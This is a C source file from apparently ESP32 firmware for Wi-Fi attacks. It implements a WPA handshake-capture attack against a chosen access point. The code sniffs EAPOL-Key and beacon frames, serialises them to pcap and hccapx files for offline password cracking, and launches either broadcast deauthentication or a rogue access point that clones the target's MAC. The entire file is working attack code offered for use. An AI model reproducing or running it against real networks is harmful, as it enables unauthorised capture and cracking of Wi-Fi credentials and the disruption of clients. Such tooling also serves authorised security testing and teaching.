#include "Attack/attack_handshake.h"

#include <string.h>

#include "esp_log.h"
#include "esp_err.h"

#include "AttackLog/log.h"
#include "esp_event.h"
#include "esp_wifi_types.h"

#include "Attack/attack.h"
#include "Attack/attack_method.h"
#include "WifiController/wifi_controller.h"
#include "FrameAnalyzer/frame_analyzer.h"
#include "PcapSerializer/pcap_serializer.h"
#include "HccapxSerializer/hccapx_serializer.h"
#include "WifiController/sniffer.h"
#include "FrameAnalyzer/frame_analyzer_parser.h"

static const char *TAG = "attack_handshake";
static attack_handshake_methods_t method = (attack_handshake_methods_t) -1;
static const wifi_ap_record_t *ap_record = NULL;
static bool beacon_captured = false;

/**
 * @brief Callback for DATA_FRAME_EVENT_EAPOLKEY_FRAME event.
 */
static void eapolkey_frame_handler(void *args, esp_event_base_t event_base, int32_t event_id, void *event_data) {
    ATTACK_LOG_I(TAG, "Got EAPoL-Key frame");
    ATTACK_LOG_D(TAG, "Proc. handshake frame...");
    wifi_promiscuous_pkt_t *frame = (wifi_promiscuous_pkt_t *) event_data;
    attack_append_status_content(frame->payload, frame->rx_ctrl.sig_len);
    pcap_serializer_append_frame(frame->payload, frame->rx_ctrl.sig_len, frame->rx_ctrl.timestamp);
    hccapx_serializer_add_frame((data_frame_t *) frame->payload);
    
    if(hccapx_serializer_is_valid() && method == ATTACK_HANDSHAKE_METHOD_BROADCAST){
        ATTACK_LOG_I(TAG, "Handshake! Stop attack.");
        attack_update_status(FINISHED);
        attack_handshake_stop();
    }
}

/**
 * @brief Callback for management frames (Beacon focus)
 */
static void management_frame_handler(void *args, esp_event_base_t event_base, int32_t event_id, void *event_data) {
    if (beacon_captured) return;

    wifi_promiscuous_pkt_t *frame = (wifi_promiscuous_pkt_t *) event_data;
    data_frame_mac_header_t *mac_header = (data_frame_mac_header_t *) frame->payload;

    // Check if it's a Beacon frame (Subtype 8)
    if (mac_header->frame_control.type == WIFI_PKT_MGMT && mac_header->frame_control.subtype == 8) {
        if (is_frame_bssid_matching(frame, (uint8_t *)ap_record->bssid)) {
            ATTACK_LOG_I(TAG, "Captured Beacon from AP");
            pcap_serializer_append_frame(frame->payload, frame->rx_ctrl.sig_len, frame->rx_ctrl.timestamp);
            beacon_captured = true;
        }
    }
}

void attack_handshake_start(attack_config_t *attack_config){
    ATTACK_LOG_I(TAG, "Start handshake attack...");
    method = (attack_handshake_methods_t) attack_config->method;
    ap_record = attack_config->ap_record;
    pcap_serializer_init();
    hccapx_serializer_init(ap_record->ssid, strlen((char *)ap_record->ssid));
    beacon_captured = false;
    wifictl_sniffer_filter_frame_types(true, true, false);
    wifictl_sniffer_start(ap_record->primary);
    frame_analyzer_capture_start(SEARCH_HANDSHAKE, ap_record->bssid);
    ESP_ERROR_CHECK(esp_event_handler_register(FRAME_ANALYZER_EVENTS, DATA_FRAME_EVENT_EAPOLKEY_FRAME, &eapolkey_frame_handler, NULL));
    ESP_ERROR_CHECK(esp_event_handler_register(SNIFFER_EVENTS, SNIFFER_EVENT_CAPTURED_MGMT, &management_frame_handler, NULL));
    switch(attack_config->method){
        case ATTACK_HANDSHAKE_METHOD_BROADCAST:
            ATTACK_LOG_D(TAG, "Method: BROADCAST");
            attack_method_broadcast(ap_record, 5);
            break;
        case ATTACK_HANDSHAKE_METHOD_ROGUE_AP:
            ATTACK_LOG_D(TAG, "Method: ROGUE_AP");
            attack_method_rogueap(ap_record);
            break;
        case ATTACK_HANDSHAKE_METHOD_PASSIVE:
            ATTACK_LOG_D(TAG, "Method: PASSIVE");
            // No actions required. Passive handshake capture
            break;
        default:
            ATTACK_LOG_D(TAG, "Unknown meth. -> PASSIVE");
    }
}

void attack_handshake_stop(){
    switch(method){
        case ATTACK_HANDSHAKE_METHOD_BROADCAST:
            attack_method_broadcast_stop();
            break;
        case ATTACK_HANDSHAKE_METHOD_ROGUE_AP:
            wifictl_restore_ap_mac();
            wifictl_mgmt_ap_start();
            break;
        case ATTACK_HANDSHAKE_METHOD_PASSIVE:
            // No actions required.
            break;
        default:
            ATTACK_LOG_E(TAG, "Unknown method! Stop fail");
    }
    wifictl_sniffer_stop();
    frame_analyzer_capture_stop();
    ESP_ERROR_CHECK(esp_event_handler_unregister(ESP_EVENT_ANY_BASE, ESP_EVENT_ANY_ID, &eapolkey_frame_handler));
    ESP_ERROR_CHECK(esp_event_handler_unregister(SNIFFER_EVENTS, SNIFFER_EVENT_CAPTURED_MGMT, &management_frame_handler));
    ap_record = NULL;
    method = (attack_handshake_methods_t) -1;
    ATTACK_LOG_D(TAG, "Handshake attack stopped");
}
